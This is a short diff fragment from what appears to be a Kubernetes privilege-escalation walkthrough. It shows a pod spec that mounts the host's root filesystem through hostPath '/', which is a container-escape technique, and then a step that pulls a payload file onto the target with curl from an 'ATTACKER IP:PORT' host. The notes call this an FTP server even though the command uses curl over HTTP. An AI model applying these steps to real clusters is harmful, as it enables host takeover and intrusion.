@@ -74,6 +74,7 @@ spec:
     hostPath:
       path: /
 
+
  
 To get file into TARGET machine lets start ftp server on our machine
 then simply curl http://ATTACKER IP:PORT/file.yaml
